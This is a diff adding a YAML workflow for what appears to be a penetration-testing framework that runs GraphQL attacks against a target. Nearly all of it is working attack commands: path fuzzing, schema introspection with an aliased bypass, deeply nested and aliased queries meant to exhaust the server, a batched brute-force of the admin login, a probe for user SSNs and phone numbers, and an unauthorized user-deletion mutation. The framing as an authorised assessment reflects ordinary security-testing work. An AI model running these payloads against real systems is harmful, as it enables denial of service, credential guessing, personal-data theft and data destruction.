@@ -1,0 +1,139 @@
+name: "GraphQL Enumeration"
+description: "GraphQL endpoint discovery, introspection, batching attacks, deep-query DoS, and authorization testing"
+version: "1.0"
+
+vars:
+  wordlist: "/wordlists/webcontent-top-10000.txt"
+
+preflight:
+  - id: setup
+    type: log
+    message: "GraphQL security assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Endpoint discovery ----
+  - id: discovery
+    name: "GraphQL endpoint discovery"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: ffuf_graphql
+        name: "Fuzz common GraphQL paths"
+        tool: ffuf
+        args: ["-u", "{target}/FUZZ", "-w", "{wordlist}",
+               "-mc", "200,400,404",
+               "-o", "{case_dir}/ffuf-graphql.json", "-of", "json"]
+        timeout: 120
+        artifacts: ["{case_dir}/ffuf-graphql.json"]
+
+      - id: graphw00f
+        name: "GraphQL engine fingerprint"
+        tool: graphw00f
+        args: ["-t", "{target}", "-o", "{case_dir}/graphw00f.json"]
+        timeout: 60
+        artifacts: ["{case_dir}/graphw00f.json"]
+
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-graphql.txt"]
+        timeout: 60
+
+  # ---- Phase 2: Introspection ----
+  - id: introspection
+    name: "Schema introspection"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: introspect_full
+        name: "Full schema introspection"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "{ __schema { types { name fields { name type { name kind } } } } }"}',
+               "{target}", "-o", "{case_dir}/graphql-schema.json"]
+        timeout: 30
+        artifacts: ["{case_dir}/graphql-schema.json"]
+
+      - id: introspect_limited
+        name: "Limited introspection (queries/mutations)"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}',
+               "{target}", "-o", "{case_dir}/graphql-schema-limited.json"]
+        timeout: 30
+
+      - id: introspect_aliased
+        name: "Aliased introspection bypass"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "query { a: __schema { types { name } } b: __type(name: \"User\") { name fields { name } } }"}',
+               "{target}", "-o", "{case_dir}/graphql-aliased.json"]
+        timeout: 30
+
+  # ---- Phase 3: Deep-query DoS ----
+  - id: dos_tests
+    name: "Deep-query and batching attacks"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: deep_query
+        name: "Deeply nested query"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "query { user { posts { comments { user { posts { comments { text } } } } } } }"}',
+               "{target}", "-o", "{case_dir}/graphql-deep.json"]
+        timeout: 60
+
+      - id: batch_auth
+        name: "Auth batching attack"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "mutation { l1: login(user: \"admin\", pass: \"a\") { token } l2: login(user: \"admin\", pass: \"b\") { token } l3: login(user: \"admin\", pass: \"c\") { token } }"}',
+               "{target}", "-o", "{case_dir}/graphql-batch-auth.json"]
+        timeout: 30
+
+      - id: aliased_dos
+        name: "Aliased resource exhaustion"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "query { a1: user(id: 1) { name } a2: user(id: 1) { name } a3: user(id: 1) { name } a4: user(id: 1) { name } a5: user(id: 1) { name } }"}',
+               "{target}", "-o", "{case_dir}/graphql-aliased-dos.json"]
+        timeout: 30
+
+  # ---- Phase 4: Authorization testing ----
+  - id: auth_tests
+    name: "GraphQL authorization tests"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: noauth_query
+        name: "Unauthenticated query"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "{ __typename }"}',
+               "{target}", "-o", "{case_dir}/graphql-noauth.json"]
+        timeout: 30
+
+      - id: field_access
+        name: "Field-level auth test"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "{ user(id: 1) { email phone ssn role } }"}',
+               "{target}", "-o", "{case_dir}/graphql-field-auth.json"]
+        timeout: 30
+
+      - id: mutation_test
+        name: "Unauthorized mutation"
+        tool: curl
+        args: ["-s", "-X", "POST", "-H", "Content-Type: application/json",
+               "-d", '{"query": "mutation { deleteUser(id: 1) { success } }"}',
+               "{target}", "-o", "{case_dir}/graphql-mutation-auth.json"]
+        timeout: 30
+
+  # ---- Phase 5: Report ----
+  - id: report
+    name: "GraphQL assessment note"
+    type: log
+    message: |
+      GraphQL enumeration complete for {target}.
+      Check {case_dir}/ for schema dumps, introspection results, DoS tests, and auth bypass attempts.
